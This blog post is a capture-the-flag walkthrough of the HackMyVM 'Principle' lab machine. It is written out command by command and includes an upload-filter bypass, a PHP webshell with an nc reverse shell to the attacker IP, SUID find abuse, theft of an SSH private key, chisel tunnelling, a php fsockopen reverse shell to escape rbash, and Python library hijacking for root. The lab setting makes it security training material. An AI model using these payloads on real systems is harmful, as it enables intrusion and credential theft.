---
title: HMV Principle walkthrough
date: 2023-07-28 00:00:01 +0000
categories: [hmv, walkthrough]
tags: [hackmyvm, walkthrough, hmv, virtualhost, form abuse, rbash escape, find abuse, cp abuse, sudoers misconfiguration, reverse proxy, chisel, privilege escalation, python library hijacking]
img_path: /assets/img/posts/
---

![Principle](hmv-principle-logo.png)
*HMV Principle*

Lastly I've been acting (gladly) as beta tester for my friend [Kaian][1].
[Kaian][1] did the [Principle][2] box for [HackMyVm](https://hackmyvm.eu/) and I was one of the chosen to test it.
It was a very fun machine and it was a great experience help him to do it.
I have to say that there is **A LOT** of work behind each one of this little machines.

Although [Principle][2] is an medium level machine (it was meant to be easy), I have to admit that I learned a few things along the way.

And, as I completed the box, I have earned the right to write my walkthrough ;)

# Annotations

>In this article we are going to asume the following ip addresses:
>
>Local machine (attacker, local host): 10.0.0.1
>
>Target machine (victim, [Principle][2] box): 10.0.0.2
{: .prompt-info}

# Enumeration

We are going to scan the target machine to find out what services are running:

```
$ nmap -P0 -n -p- -sV -T5 -oA nmap_principle 10.0.0.1
```

```
80/tcp open  http    nginx 1.22.1
```

We can see that the target has a nginx 1.22.1 server running on port 80.

# Web footprinting

If we browse to the target we can see the nginx default welcome page:

![nginx welcome page](hmv-principle-nginx-default-welcome-page.png)
*nginx welcome page*

## Directory enumeration

Let's see if there are hidden files or directories:

```
$ gobuster dir -u http://10.0.0.2 --wordlist /opt/wordlists/dirb/common.txt
```

```
/robots.txt           (Status: 200) [Size: 68]
```

We can see that there is a `robots.txt` file.
Let's take a look:

```
User-agent: *
Allow: /hi.html
Allow: /investigate
Disallow: /hackme
```

We found two new accessible resources: `hi.html` and `/investigate`.

The `hi.html` does not throw us anything interesting.

If we browse to `view-source:http://10.0.0.2/investigate/` we can see a web:

![/investigate](hmv-principle-investigate.png)
*/investigate*

If we take a look at the source code we can see the following comment:

```html
<!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory -->
```

Let's look for hidden resources in `investigate`:

```
$ gobuster dir -u http://10.0.0.2/investigate -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x php,txt,html
```
```
/index.html           (Status: 200) [Size: 812]
/rainbow_mystery.txt  (Status: 200) [Size: 596]
```

Let's see what the `rainbow_mistery.txt` contains:

```
QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg
dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g
dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g
Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=
```

We can see that it's a base64 encoding.
If we decoded it we will get the following text:

```
According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
Maybe that's why I am a robot?
Maybe that is why I am alone in this world?

The answer is here:
-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
```

We can see that the answer is morse encoded, so let's decode it:

```
DOMAIN T4L0S.HMV
```

# T4L0S.HMV Web footprinting

We have a new domain, so let's add our new domain to our `/etc/hosts/`:

```
$ echo "10.0.0.2 T4L0S.HMV" | sudo tee -a /etc/hosts
```

If we browse to `t4l0s.hmv` we can see a new web:

![t4l0s.hmv](hmv-principle-t4l0s-hmv.png)
*t4l0s.hmv*

## Source code

If we check the source code we find an interesting comment:

```html
<!- Elohim is a liar and you must not listen to him, he is not here but it is possible to find him, you must look somewhere else. ->
```

## Directory enumeration

Let's search virtual hosts here:

```
$ gobuster vhost --append-domain -u t4l0s.hmv -r -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```

```
Found: hellfire.t4l0s.hmv Status: 200 [Size: 1659]
```

Ok, we have a new host and we have to add it to our `/etc/hosts`:

```
$ echo "10.0.0.2 hellfire.t4l0s.hmv" | sudo tee -a /etc/hosts
```

# hellfire.t4l0s.hmv web footprinting

If we browse to our new domain we have a new web.

![hellfire.t4l0s.hmv](hmv-principle-hellfire-t4l0s.png)
*hellfire.t4l0s.hmv*

## Source code

If we check the source code, the only interesting thing that we found is this comment:

``` html
<!- You're on the right track, he's getting angry! ->
```

## Directory enumeration

We will search for hidden files or directories:

```
$ gobuster dir -u http://hellfire.t4l0s.hmv --wordlist /opt/wordlists/dirb/common.txt -b 403,404 -x php,txt,html
```

```
/index.php            (Status: 200) [Size: 1659]
/upload.php           (Status: 200) [Size: 748]
/output.php           (Status: 200) [Size: 1350]
/archivos             (Status: 301) [Size: 169] [--> http://hellfire.t4l0s.hmv/archivos/]
```

The interesting resource, here, is `upload.php`.
If we browse to `http://hellfire.t4l0s.hmv/upload.php` we have a web from which we can upload an image.

![automata photo upload](hmv-principle-automata-photo-upload.png)
*automata photo upload*

We can upload images, so we have to find out if we can exploit this page to gain access to the box.

![image uploaded](hmv-principle-image-uploaded.png)
*image uploaded*

We will try to upload a php file to see if we can do a remote code execution (RCE).
We create a new php file with the following content:

```php
<?php system('id'); ?>
```

It seems that the web performs checks on the uploaded files and that only images can be uploaded.

![The file must be an image](hmv-principle-the-file-must-be-an-image.png)
*The file must be an image*

Let's open `burp` and try to dodge the restrictions.
We configure burp as our proxy and intercept the requests.
We will modify the upload request, and we will change the `Content-Type` from `application/x-php` to `image/jpeg`:

![Content-Type: application/x-php](hmv-principle-content-type-application-x-php.png)
*Content-Type: application/x-php*

![Content-Type: image/jpeg](hmv-principle-content-type-image-jpeg.png)
*Content-Type: image/jpeg*

Once our RCE (Remote Code Execution) test is uploaded we can see that we can perform a RCE:

```
$ curl "http://hellfire.t4l0s.hmv/archivos/rctest.php" 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Foothold

We have to take advantage of the RCE to convert it in a remote shell.
First we need to start a netcat listener on our host:

```
$ nc -lvnp 1234
```

And, now, we will upload a new php file, but, this time, we will upload a bash one-liner reverse shell:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"); ?>
```

Once our file is uploaded we got shell!

We will upgrade our tty:

```
$ script /dev/null -c bash
Ctrl+Z
$ stty raw -echo; fg
$ reset
$ export TERM=xterm
$ export SHELL=bash
```

```
$ whoami
www-data
```

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As the `www-data` user is not very useful to us, we need to find a way to pivot to side-pivot to another, more useful, user.

We find other users in this machine.

```
$ cat /etc/passwd
```

```
talos:x:1000:1000:Talos,,,:/home/talos:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
elohim:x:1001:1001::/home/gehenna:/bin/rbash
sml:x:1002:1002::/home/sml:/bin/bash
```

```
$ ls -la /home
```

```
drwxr-xr-x  4 elohim elohim 4096 Jul 14 11:25 gehenna
drwxr-xr-x  4 talos  talos  4096 Jul 14 07:26 talos
```

We look for files with suid:

```
$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
```

The `find` binary seems suspicious:

```
$ ls -la find
```

```
-rwsr-xr-x  1 talos root     224848 Jan  8  2023 find
```

So when we use `find` we are using it as the user `talos`.
We can take advantage of this abusing the binary.


If we check `/home/talos` we find a note:

```
$ ls -la /home/talos
```

```
-rw-r----- 1 talos talos  320 Jul 13 15:42 note.txt
```

We abuse `find` to read `note.txt`:

```
$ find . -exec cat /home/talos/note.txt \; -quit
Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!
Now we are very close to finding this false God Elohim.
I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)
The tool I left you is still your ally. Good luck to you.
```

A few gods (in a couple of languages) later...

```
$ find / -iname *afrodita*  2>/dev/null
/etc/selinux/Afrodita.key
```

Let's see what `Afrodita.key` file contais:

```
$ cat /etc/selinux/Afrodita.key 
Here is my password:
xxxxxxxxxxx

Now I have done another little trick to help you reach Elohim.
REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.
```

## talos

Now we can be `talos`:

```
$ su - talos
```

Let's see what we can do:

```
talos@Principle:~$ sudo -l
Matching Defaults entries for talos on principle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User talos may run the following commands on principle:
    (elohim) NOPASSWD: /bin/cp
```

### First flag

Now, we can use `/bin/cp` as `elohim`.
Let's see what we can find in `/home/gehenna`:

```
talos@Principle:~$ ls -la /home/gehenna/
total 40
drwxr-xr-x 4 elohim elohim 4096 Jul 14 11:25 .
drwxr-xr-x 4 root   root   4096 Jul  4 06:11 ..
-rw------- 1 elohim elohim  289 Jul 14 06:38 .bash_history
-rw-r----- 1 elohim elohim  261 Jul  5 08:13 .bash_logout
-rw-r----- 1 elohim elohim 3830 Jul 14 06:37 .bashrc
-rw-r----- 1 elohim elohim  777 Jul 13 17:19 flag.txt
drw-r----- 3 elohim elohim 4096 Jul  2 20:52 .local
-rw-r----- 1 elohim elohim   21 Jul 12 05:35 .lock
-rw-r----- 1 elohim elohim  807 Jul  6 06:28 .profile
drwx------ 2 elohim elohim 4096 Jul  6 11:05 .ssh
```

We can get our first flag:

```
talos@principle:/bin$ sudo -u elohim /bin/cp /home/gehenna/flag.txt /dev/stdout
```

`lock` seems an interesting file, above all after the hint that `talos` give us:

>he keeps the lock coded and hidden at home

So we print the file content and keep a copy of in our machine:

```
talos@principle$ sudo -u elohim /bin/cp /home/gehenna/.lock /dev/stdout
```

Another interesting directory is `.ssh`.
Seems that elohim could connect via ssh using an rsa private key.
But, we didn't find an ssh service exposed...
Anyway, we are going to copy the directory content to our /home.
We can't list the files here, but there always the same, so we try a the usual names:

```
$ sudo -u elohim /bin/cp /home/gehenna/.ssh/authorized_keys /dev/stdout
```

```
$ sudo -u elohim /bin/cp /home/gehenna/.ssh/id_rsa /dev/stdout
```

And we save in our machine the content of these files too.

We also can see some interesting information gossiping the `.bashrc` and `.bash_history` files.
We can see that `elohim` edited the python subprocess library:

```
nano /usr/lib/python3.11/subprocess.py
```

And we can see that `elohim` has some aliases defined to restrict a few commands:

```
# GOD aliases
alias cat="rbash cat: restricted"
alias vi='rbash: vi: restricted'
alias pico='rbash: pico: restricted'
alias nano='rbash: nano: restricted'
```

### SSH

We have to check if there is a SSH service running without being exposed to the outside.

```
$ systemctl status sshd
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; preset: enabled)
     Active: active (running) since
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 441 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 461 (sshd)
      Tasks: 1 (limit: 202)
     Memory: 4.6M
        CPU: 333ms
     CGroup: /system.slice/ssh.service
             └─461 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
```

There is a ssh service running. Now we have to find in which port:

```
$ ss -tunel
talos@principle:~/.ssh$ ss -tunel
Netid          State           Recv-Q           Send-Q                     Local Address:Port                     Peer Address:Port          Process                                                                
udp            UNCONN          0                0                                0.0.0.0:68                            0.0.0.0:*              ino:14407 sk:1 cgroup:/system.slice/ifup@enp0s3.service <->           
tcp            LISTEN          0                128                              0.0.0.0:3445                          0.0.0.0:*              ino:14524 sk:2 cgroup:/system.slice/ssh.service <->
```

Ok. There is a SSH service running on port 3445 and not exposed to the outside.

As we don't have permissions to execute ssh, we need to do a reverse proxy tuneling.
And, for this, we are going yo use `chisel`.

We need to know the machine architecture to know what `chisel` binary upload:

```
talos@principle:~/.ssh$ uname -a
Linux principle 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
```

We already knew that it was a linux machine, and now, we also know that it has an amd64 architecture, so we need to upload the linux_amd64 binary.
We will send the binary from our host to the server using `netcat`.
We start the file transfer on our host:

```
$ nc -lvnp 443 < chisel_1.8.1_linux_amd64
```

And we start receiving the file in the [Principle][2] machine:

```
$ cat > chisel < /dev/tcp/10.0.0.1/443
```

We have to give execution permissions to the `chisel` binary in the [Principle][2] machine:

```
$ chmod 700 chisel
```

Now we have to setup the reverse proxy.
We will establish the `chisel` server in our host:

```
$ /chisel_1.8.1_linux_amd64 server --reverse -p 8080
```

And we start the `chisel` client in the [Principle][2] machine:

```
$ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:3445
```

So we can connect via ssh using a private key, we need to give it the right permissions:

```
$ chmod 600 elohim_id_rsa
```

To connect to [Principle][2] via our reverse proxy we need to connect to the reverse proxy running on our host:

```
$ ssh elohim@localhost -p22222 -i elohim_id_rsa

Enter passphrase for key 'id_rsa':
```

We have to enter a passphrase.
Don't worry, rember the words of `talos`:

>he keeps the lock coded and hidden at home

This is where the `.lock` file will be useful.

The file content is: `7072696e6369706c6573`, and we know that is encoded.
It's encoded in hexadecimal, if we decode it we obtain: `principles`, and this is this passphrase.
Now we can connect via ssh to the [Principle][2] machine.

```
$ ssh elohim@localhost -p22222 -i elohim_id_rsa

Enter passphrase for key 'id_rsa':
```

We are already inside and we are `elohim`

## elohim

```
elohim@principle:~$ id
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
```

Interesting, we are part from the `sml` group.
Let's see what we can do with `sudo`:

```
Matching Defaults entries for elohim on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User elohim may run the following commands on principle:
    (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py
```

We can execute the python script `/opt/reviewer.py` as `root`, but we are trapped in a `rbash` shell.
So, we need to escape from the `rbash`.
We can escape from the `rbash` and get a `bash` shell using php:

```
elohim@principle:~$ php -r '$sock=fsockopen("10.0.0.1",4545);exec("/bin/bash -i <&3 >&3 2>&3");'
```

To move confortably we will disable the following restricted aliases:

```
$ unalias cat
$ unalias vi
```

If we check the `reviewer.py` script, we can see that we don't have permissions to write it, but we can read it:

```
elohim@principle:~$ ls -la /opt/
```

```
-rwxr-xr-x  1 root root 1072 Jul  7 15:17 reviewer.py
```

And we can see that the `reviewer.py` script file is using the following libraries:

```python
import os
import subprocess
```

If we remember, `elohim` was writting in the subproces library:

```
nano /usr/lib/python3.11/subprocess.py
```

Let's check the library permissions:

```
elohim@principle:~$ ls -la /usr/lib/python3.11/subprocess.py
-rw-rw-r-- 1 root sml 85745 Jul 11 19:04 /usr/lib/python3.11/subprocess.py
```

As the `sml` group has write permissions, and we are in the `sml` group, we can write this library.
We can take advantage of this and perform a python library hijacking.

# Privilege escalation (Python library hijacking)

As the python subprocess library is writable, we can spawn a bash shell from there.
We will append the following line to the library:

```python
os.system('/bin/bash')
```

Now, when we load the library it will open a bash shell.
As we can invoke the script that loads the subprocess libary as root, we will get a root shell:

```
$ sudo /usr/bin/python3 /opt/reviewer.py
```

And we can read our last flag!

```
root@principle:/opt# cat /root/flag.txt
```

*Enjoy! ;)*

[1]: https://[Kaian][1]perez.github.io
[2]: https://hackmyvm.eu/machines/machine.php?vm=Principle
